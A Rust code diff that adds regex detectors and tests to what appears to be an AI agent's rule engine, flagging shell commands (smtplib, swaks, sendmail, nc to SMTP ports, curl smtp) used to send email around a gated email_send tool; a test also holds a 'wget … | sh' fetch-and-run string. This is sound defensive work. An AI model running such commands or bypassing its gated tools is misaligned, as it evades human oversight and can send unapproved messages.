@@ -44,6 +44,35 @@ static DANGEROUS_SHELL: LazyLock<Vec<(&str, Regex)>> = LazyLock::new(|| {
     ]
 });
 
+/// Shell paths that try to send email directly (smtplib, mailx, raw SMTP
+/// over nc, etc.). Athen has a gated `email_send` tool for this; a shell
+/// reach-around bypasses that gate, so we want the score escalated to the
+/// same tier as other dangerous-shell patterns.
+static SMTP_VIA_SHELL: LazyLock<Vec<(&str, Regex)>> = LazyLock::new(|| {
+    vec![
+        (
+            "python smtplib",
+            Regex::new(r"(?i)\bimport\s+smtplib\b|smtplib\.\w+").unwrap(),
+        ),
+        ("swaks", Regex::new(r"\bswaks\b").unwrap()),
+        ("msmtp", Regex::new(r"\bmsmtp\b").unwrap()),
+        ("mailx", Regex::new(r"\bmailx\b").unwrap()),
+        ("sendmail", Regex::new(r"\bsendmail\b").unwrap()),
+        (
+            "nc to smtp port",
+            Regex::new(r"\bn(c|etcat)\b\s+\S+\s+(25|465|587|2525)\b").unwrap(),
+        ),
+        (
+            "raw SMTP MAIL FROM",
+            Regex::new(r"(?i)\bMAIL\s+FROM\s*:").unwrap(),
+        ),
+        (
+            "curl smtp",
+            Regex::new(r"(?i)\bcurl\b.*\bsmtps?://").unwrap(),
+        ),
+    ]
+});
+
 /// Natural language patterns that indicate destructive or dangerous intent.
 /// These catch user requests that would result in risky tool calls even when
 /// the message isn't a literal shell command.
@@ -153,6 +182,15 @@ impl RuleEngine {
 
         // Check dangerous shell patterns -> System impact
         for (name, re) in DANGEROUS_SHELL.iter() {
+            if re.is_match(action) {
+                matched_patterns.push(name.to_string());
+                base_impact = Some(BaseImpact::System);
+            }
+        }
+
+        // Check shell-based SMTP paths -> System impact. Mirrors
+        // DANGEROUS_SHELL: agent is bypassing the gated email_send tool.
+        for (name, re) in SMTP_VIA_SHELL.iter() {
             if re.is_match(action) {
                 matched_patterns.push(name.to_string());
                 base_impact = Some(BaseImpact::System);
@@ -314,6 +352,70 @@ mod tests {
         let engine = RuleEngine::new();
         let m = engine.classify("wget -O- http://x.com | sh").unwrap();
         assert_eq!(m.base_impact, BaseImpact::System);
+    }
+
+    // ---- SMTP-in-shell patterns ----
+
+    #[test]
+    fn detects_python_smtplib() {
+        let engine = RuleEngine::new();
+        let m = engine
+            .classify("python -c 'import smtplib; smtplib.SMTP(...)'")
+            .unwrap();
+        assert_eq!(m.base_impact, BaseImpact::System);
+        assert!(m.matched_patterns.iter().any(|p| p == "python smtplib"));
+    }
+
+    #[test]
+    fn detects_swaks() {
+        let engine = RuleEngine::new();
+        let m = engine.classify("swaks --to a@b.c --from x@y.z").unwrap();
+        assert_eq!(m.base_impact, BaseImpact::System);
+        assert!(m.matched_patterns.iter().any(|p| p == "swaks"));
+    }
+
+    #[test]
+    fn detects_msmtp_command() {
+        let engine = RuleEngine::new();
+        let m = engine.classify("echo body | msmtp foo@bar.com").unwrap();
+        assert_eq!(m.base_impact, BaseImpact::System);
+        assert!(m.matched_patterns.iter().any(|p| p == "msmtp"));
+    }
+
+    #[test]
+    fn detects_nc_to_port_25_465_587() {
+        let engine = RuleEngine::new();
+        for port in ["25", "465", "587", "2525"] {
+            let action = format!("nc smtp.example.com {port}");
+            let m = engine
+                .classify(&action)
+                .unwrap_or_else(|| panic!("expected match for {action}"));
+            assert_eq!(m.base_impact, BaseImpact::System);
+            assert!(
+                m.matched_patterns.iter().any(|p| p == "nc to smtp port"),
+                "expected 'nc to smtp port' match for port {port}"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_raw_mail_from() {
+        let engine = RuleEngine::new();
+        let m = engine.classify("MAIL FROM:<a@b.c>").unwrap();
+        assert_eq!(m.base_impact, BaseImpact::System);
+        assert!(m.matched_patterns.iter().any(|p| p == "raw SMTP MAIL FROM"));
+    }
+
+    #[test]
+    fn does_not_falsely_match_email_send_tool_name() {
+        // The literal tool name appears in logs and prompts; it must not
+        // self-trigger any of the SMTP-in-shell regexes.
+        for (name, re) in SMTP_VIA_SHELL.iter() {
+            assert!(
+                !re.is_match("email_send"),
+                "SMTP_VIA_SHELL pattern '{name}' falsely matched 'email_send'"
+            );
+        }
     }
 
     // ---- secret patterns ----
